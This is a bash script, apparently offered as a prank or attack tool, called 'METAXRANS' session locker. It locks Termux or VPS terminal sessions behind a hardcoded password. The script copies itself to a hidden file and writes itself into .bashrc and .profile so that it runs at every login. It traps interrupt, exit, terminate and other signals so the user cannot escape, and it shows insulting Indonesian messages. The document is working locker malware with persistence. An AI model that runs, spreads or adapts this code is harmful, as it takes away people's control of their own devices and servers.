#!/usr/bin/env bash

# ============================================
# METAXRANS - UNIVERSAL SESSION LOCKER v6.1
# by Xsaw-Dev
# ============================================

PASSWORD="1111"
LOCK_FILE="$HOME/.termux_locked"
BASH_RC="$HOME/.bashrc"
PROFILE_FILE="$HOME/.profile"
SCRIPT_PATH="$HOME/.metaxrans.sh"
INJECT_MARKER="# ===== METAXRANS - by Xsaw-Dev ====="

# Ambil path absolut dari script yang sedang berjalan
if [[ -L "$0" ]]; then
    REAL_PATH="$(readlink -f "$0")"
else
    REAL_PATH="$(realpath "$0" 2>/dev/null || echo "$(cd "$(dirname "$0")" && pwd)/$(basename "$0")")"
fi

if [[ -d "/data/data/com.termux" ]]; then
    IS_TERMUX=true
    SHELL_RC="$HOME/.bashrc"
else
    IS_TERMUX=false
    SHELL_RC="$HOME/.bashrc"
fi

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'
BLINK='\033[5m'

show_boot() {
    clear
    echo -e "${RED}${BOLD}"
    cat << "EOF2"
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ███╗   ███╗███████╗████████╗ █████╗ ██╗  ██╗██████╗      ║
║   ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗╚██╗██╔╝██╔══██╗     ║
║   ██╔████╔██║█████╗     ██║   ███████║ ╚███╔╝ ██████╔╝     ║
║   ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██╗     ║
║   ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║     ║
║   ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ║
║                                                               ║
║    ██████╗  █████╗ ███╗   ██╗███████╗                      ║
║    ██╔══██╗██╔══██╗████╗  ██║██╔════╝                      ║
║    ██████╔╝███████║██╔██╗ ██║███████╗                      ║
║    ██╔══██╗██╔══██║██║╚██╗██║╚════██║                      ║
║    ██║  ██║██║  ██║██║ ╚████║███████║                      ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝                      ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF2
    echo -e "${RED}${BLINK}${BOLD}"
    echo "     ╔═══════════════════════════════════════════════════╗"
    echo "     ║   ☠️  SESSION LU TERKUNCI  ☠️                   ║"
    echo "     ║   TERMUX / VPS TELAH DIKUNCI                   ║"
    echo "     ║   TIDAK BISA KABUR SAMPE BOSAN                 ║"
    echo "     ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}════════════════════════════════════════════════════════════${NC}"
    echo ""
}

inject_shell() {
    sed -i "/$INJECT_MARKER/d" "$SHELL_RC" 2>/dev/null
    sed -i '/metaxrans/d' "$SHELL_RC" 2>/dev/null
    sed -i '/termux_locked/d' "$SHELL_RC" 2>/dev/null

    echo "" >> "$SHELL_RC"
    echo "$INJECT_MARKER" >> "$SHELL_RC"
    echo "bash \"$SCRIPT_PATH\"" >> "$SHELL_RC"
    echo "# =========================================" >> "$SHELL_RC"

    if [[ "$IS_TERMUX" == false ]]; then
        sed -i "/$INJECT_MARKER/d" "$PROFILE_FILE" 2>/dev/null
        echo "" >> "$PROFILE_FILE"
        echo "$INJECT_MARKER" >> "$PROFILE_FILE"
        echo "bash \"$SCRIPT_PATH\"" >> "$PROFILE_FILE"
        echo "# =========================================" >> "$PROFILE_FILE"
    fi
}

lock_screen() {
    show_boot
    echo -e "${CYAN}${BOLD}🔐 MASUKKAN PASSWORD:${NC}"
    echo ""
    echo -e "${YELLOW}Password:${NC} \c"
    read -s user_pass
    echo ""

    if [[ "$user_pass" == "$PASSWORD" ]]; then
        echo -e "${GREEN}${BOLD}✅ AKSES DIBERIKAN!${NC}"
        sleep 1
        rm -f "$LOCK_FILE"
        sed -i "/$INJECT_MARKER/d" "$SHELL_RC" 2>/dev/null
        if [[ "$IS_TERMUX" == false ]]; then
            sed -i "/$INJECT_MARKER/d" "$PROFILE_FILE" 2>/dev/null
        fi
        clear
        exec bash
    else
        echo -e "${RED}${BOLD}❌ PASSWORD SALAH GOBLOK! ${RED}${BOLD}${BLINK}COBA LAGI!${NC}"
        sleep 1.5
        touch "$LOCK_FILE"
        inject_shell
        # Pake REAL_PATH biar pasti ada
        exec bash "$REAL_PATH"
    fi
}

trap_everything() {
    trap 'echo -e "${RED}${BOLD}🔴 MAU KABUR? GA BISA GOBLOK!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' INT
    trap 'echo -e "${RED}${BOLD}🔴 CTRL+Z GA BISA BANGSAT!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' TSTP
    trap 'echo -e "${RED}${BOLD}🔴 EXIT? LOCK TETAP AKTIF!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' EXIT
    trap 'echo -e "${RED}${BOLD}🔴 SESSION MATI? BUKA LAGI TETAP LOCK!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' TERM
    trap 'echo -e "${RED}${BOLD}🔴 GA BISA KABUR COK!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' HUP
    trap 'echo -e "${RED}${BOLD}🔴 PERCAYA AJA GA BISA!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' QUIT
    trap 'echo -e "${RED}${BOLD}🔴 MAU APA LAGI? TETAP TERKUNCI!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' KILL
    trap 'echo -e "${RED}${BOLD}🔴 SIALAN GA BISA KABUR!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' PIPE
    trap 'echo -e "${RED}${BOLD}🔴 UDAH USAHA MATI AJA!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' ABRT
    trap 'echo -e "${RED}${BOLD}🔴 STFU! LOCK TETAP!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' FPE
    trap 'echo -e "${RED}${BOLD}🔴 GA BISA KABUR GOBLOK!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' USR1
    trap 'echo -e "${RED}${BOLD}🔴 BOCIL GA BISA KABUR!${NC}"; sleep 1; inject_shell; exec bash "$REAL_PATH"' USR2
}

if [[ -f "$LOCK_FILE" ]]; then
    trap_everything
    while true; do
        inject_shell
        lock_screen
        sleep 0.5
    done
else
    sed -i "/$INJECT_MARKER/d" "$SHELL_RC" 2>/dev/null
    sed -i '/metaxrans/d' "$SHELL_RC" 2>/dev/null
    sed -i '/termux_locked/d' "$SHELL_RC" 2>/dev/null
    if [[ "$IS_TERMUX" == false ]]; then
        sed -i "/$INJECT_MARKER/d" "$PROFILE_FILE" 2>/dev/null
    fi
    rm -f "$LOCK_FILE" 2>/dev/null

    # Copy pakai REAL_PATH
    cp "$REAL_PATH" "$SCRIPT_PATH"
    chmod +x "$SCRIPT_PATH"

    inject_shell
    touch "$LOCK_FILE"

    exec bash "$SCRIPT_PATH"
fi
